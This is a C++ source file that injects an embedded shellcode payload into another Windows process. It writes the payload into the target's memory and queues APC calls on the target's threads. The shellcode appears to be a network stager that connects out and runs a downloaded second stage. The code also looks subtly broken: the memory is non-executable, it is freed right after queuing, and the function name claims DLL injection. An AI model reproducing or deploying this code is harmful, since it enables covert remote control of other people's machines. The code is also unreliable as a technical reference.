#include "header.h"
#include "ntapi.h"
#include "inject.h"
#include <vector>

using namespace std;
vector<DWORD> GetProcessThreads(DWORD pid) {

	vector<DWORD> tids;
	HANDLE hThreadSnap, hThread;
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap) {
		THREADENTRY32 ThreadEntry32;
		ZeroMemory(&ThreadEntry32, sizeof(ThreadEntry32));
		ThreadEntry32.dwSize = sizeof(ThreadEntry32);
		if (Thread32First(hThreadSnap, &ThreadEntry32)) {
		
			do {
				if (ThreadEntry32.th32OwnerProcessID == pid) {
					tids.push_back(ThreadEntry32.th32ThreadID);
				}
			} while (Thread32Next(hThreadSnap, &ThreadEntry32));
		}
		
	}

	CloseHandle(hThreadSnap);
	return tids;
}

BOOL InjectDLLIntoTarget(HANDLE hTargetProcess) {

	NTSTATUS ntstatus;
	DWORD dwProcessID = GetProcessId(hTargetProcess);
	LPVOID allocatedMemory = 0;
	SIZE_T NumberOfBytesWritten = 0;
	unsigned char shellcode[] =
		"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5"
		"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
		"\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
		"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3"
		"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1"
		"\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
		"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
		"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
		"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
		"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
		"\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
		"\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68"
		"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6\x6a"
		"\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x0f\x85\x58"
		"\x00\x00\x00\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec"
		"\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00"
		"\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e"
		"\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
		"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9"
		"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

	SIZE_T shellcode_size = sizeof(shellcode);
	pNtAllocateVirtualMemory fpNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	pNtWriteVirtualMemory fpNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	pNtSuspendThread fpNtSuspendThread = (pNtSuspendThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendThread");
	pNtAlertResumeThread fpNtAlertResumeThread = (pNtAlertResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread");
	pNtQueueApcThread fpNtQueueApcThread = (pNtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");

	if (allocatedMemory = VirtualAllocEx(hTargetProcess, 0, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) {
		printf("[+] Allocated Memory: 0x%p\n", allocatedMemory);
		if (WriteProcessMemory(hTargetProcess, allocatedMemory, shellcode, shellcode_size, &NumberOfBytesWritten)) {
			//if (NT_SUCCESS(fpNtWriteVirtualMemory(hTargetProcess, pvDllMemory, dllPath, sDLLLength, &NumberOfBytesWritten))) {
			printf("[+] Number of Bytes Written in 0x%p: %d %d\n", allocatedMemory, NumberOfBytesWritten, shellcode_size);
			try {				
				vector<DWORD> tids = GetProcessThreads(dwProcessID);
				if (tids.empty()) {
					printf("[-] Failed to get Process Threads\n");
					return FALSE;
				}

				for (const DWORD tid : tids) {
					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, NULL, tid);
					if (hThread) {
						QueueUserAPC((PAPCFUNC)allocatedMemory, hThread, (ULONG_PTR)allocatedMemory);
						printf("[+] Done\n");
						CloseHandle(hThread);
					}
				}
			}
			catch (...) {
				printf("[-] Exception Occured\n");
				goto cleanup;
			}
		}
		else {
			printf("asdasdasd %d", GetLastError());
		}
	}
	else {
		printf("aghghgh %d", GetLastError());
	}

cleanup:
	if (allocatedMemory) {
		VirtualFreeEx(hTargetProcess, allocatedMemory, shellcode_size, MEM_RELEASE);
	}
	return FALSE;
}